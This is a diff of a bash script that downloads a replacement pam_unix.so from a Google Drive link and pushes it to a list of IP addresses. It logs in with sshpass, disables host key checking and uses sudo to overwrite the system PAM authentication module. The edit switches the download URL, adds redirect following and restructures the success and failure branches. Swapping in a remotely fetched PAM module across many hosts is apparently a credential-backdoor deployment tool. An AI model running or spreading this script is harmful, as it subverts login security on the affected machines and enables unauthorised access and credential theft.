@@ -9,10 +9,10 @@ timeout=5
 max_jobs=10
 path_to_pam="/lib/x86_64-linux-gnu/security/pam_unix.so"
 path_to_tmp_pam="/tmp/pam_unix.so"
-link_to_pam="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
+link_to_pam="https://drive.google.com/uc?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download"
 
 main() {
-    apt install -y sshpass
+    apt install -y curl sshpass
     curl -o "$path_to_tmp_pam" "$link_to_pam"
 
     local IPs=()
@@ -25,18 +25,20 @@ main() {
     local job_count=0
     for IP in "${IPs[@]}"; do
         {
-            sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$path_to_tmp_pam" "$username@$IP:$path_to_pam" && \
-            echo "SUCCESS (SCP): $IP" || \
-            sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
+            if sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$path_to_tmp_pam" "$username@$IP:$path_to_pam"; then
+                echo "SUCCESS (SCP): $IP"
+            elif sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
                 echo \"$password\" | sudo -S apt install -y curl || \
                 echo \"$password\" | sudo -S yum install -y curl || \
                 echo \"$password\" | sudo -S zypper install -y curl || \
                 echo \"$password\" | sudo -S pacman -Syu curl --noconfirm;
-                echo \"$password\" | sudo -S curl -o \"$path_to_tmp_pam\" \"$link_to_pam\"; \
+                echo \"$password\" | sudo -S curl -L -o \"$path_to_tmp_pam\" \"$link_to_pam\"; \
                 echo \"$password\" | sudo -S mv \"$path_to_tmp_pam\" \"$path_to_pam\"
-            " && \
-            echo "SUCCESS (SSH): $IP" || \
-            echo -e "!!!!!!!!!!!!!!!!!!!!!\nFAIL: $IP\n!!!!!!!!!!!!!!!!!!!!!"
+            "; then
+                echo "SUCCESS (SSH): $IP"
+            else
+                echo -e "!!!!!!!!!!!!!!!!!!!!!\nFAIL: $IP\n!!!!!!!!!!!!!!!!!!!!!"
+            fi
         } & 
         ((job_count++))
         if ((job_count >= max_jobs)); then
